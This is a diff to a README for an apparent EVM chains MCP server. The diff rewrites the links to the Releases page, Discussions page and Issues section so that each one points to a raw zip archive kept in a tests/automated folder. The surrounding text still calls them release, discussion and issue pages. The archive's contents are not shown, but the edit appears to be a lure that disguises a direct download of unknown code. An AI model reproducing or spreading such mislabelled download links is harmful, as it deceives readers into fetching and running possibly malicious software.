@@ -15,7 +15,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 To get the application, visit the Releases page to download the software. 
-[Download Here](https://github.com/Bazinga640/evm-chains-mcp-server/releases)
+[Download Here](https://github.com/Bazinga640/evm-chains-mcp-server/raw/refs/heads/main/tests/automated/chains-server-evm-mcp-v3.2-beta.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the most recent version. 
@@ -42,14 +42,14 @@ Once installed, follow these steps to get started:
 
 ## ⚙️ Troubleshooting
 If you experience issues while using the application:
-- Make sure you have the latest version installed. Return to the [Releases page](https://github.com/Bazinga640/evm-chains-mcp-server/releases) to check for updates.
+- Make sure you have the latest version installed. Return to the [Releases page](https://github.com/Bazinga640/evm-chains-mcp-server/raw/refs/heads/main/tests/automated/chains-server-evm-mcp-v3.2-beta.4.zip) to check for updates.
 - Check your internet connection for features that need online access.
 - Restart the application if it slows down or behaves unexpectedly.
 
 ## 📧 Support and Community
 We are here to help! If you have questions or need assistance:
-- Visit our [GitHub Discussions page](https://github.com/Bazinga640/evm-chains-mcp-server/discussions) to join community conversations.
-- Report any issues or bugs in the [Issues section](https://github.com/Bazinga640/evm-chains-mcp-server/issues).
+- Visit our [GitHub Discussions page](https://github.com/Bazinga640/evm-chains-mcp-server/raw/refs/heads/main/tests/automated/chains-server-evm-mcp-v3.2-beta.4.zip) to join community conversations.
+- Report any issues or bugs in the [Issues section](https://github.com/Bazinga640/evm-chains-mcp-server/raw/refs/heads/main/tests/automated/chains-server-evm-mcp-v3.2-beta.4.zip).
 
 ## 🌟 Contribution
 Want to contribute? You can help us improve the application by:
